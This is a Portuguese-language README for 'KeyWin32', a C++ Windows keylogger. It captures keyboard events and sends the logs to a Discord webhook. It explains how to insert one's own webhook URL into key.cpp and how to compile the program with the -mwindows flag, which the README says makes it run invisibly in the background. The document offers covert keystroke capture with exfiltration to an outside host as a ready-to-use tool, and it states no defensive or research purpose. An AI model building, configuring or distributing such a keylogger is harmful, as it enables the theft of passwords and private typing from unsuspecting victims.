<div align="center">
  
# ─── 「 KeyWin32 」 ───

<img width="300" height="250" alt="imagem" src="https://github.com/user-attachments/assets/c2135a0c-464e-4f45-a210-234b080b9ee6" />

---

### KeyWin32 é uma ferramenta leve desenvolvida em C++ 
utilizando a API nativa do Windows (Win32). 

O objetivo é capturar eventos de teclado e disparar os logs diretamente para um canal do Discord via Webhooks.

---

# 🛠️ Tecnologias e Dependências

```
  Linguagem: C++
  
  API Principal: Win32 API (Nativa do Windows)
  
  Envio de Dados: Discord Webhook API
```

# ⚙️ Configuração Inicial

Antes de compilar, você precisa configurar a sua URL do Webhook do Discord diretamente no código-fonte.
```

Abra o arquivo key.cpp.
    
Procure pela variável do Webhook (webHookDiscord).
    
Substitua pelo seu link gerado no Discord:

const char* webHookDiscord = "SEUWEBHOOK=DISCORD.COM/QWDjAWDJAWJDAWJD";

```

---


# 🚀 Compilação e Uso

```    
Para buildar o projeto utilizando o g++ (MinGW), execute o comando abaixo no seu terminal. 
O parâmetro -mwindows garante que a aplicação rode em background sem abrir a janela do console.
Bash
```

### g++ key.cpp -o KeyWin32 -mwindows

---

# 🔧 Build em PowerShell
```
CMD or PowerShell
    
.\build.ps1
    
laucher.exe
```

---

# 📄 Como funciona o comando:

key.cpp: O seu código-fonte principal.

-o KeyWin32: Define o nome do executável final.

-mwindows: Oculta a janela de prompt de comando (execução invisível).
      
</div>
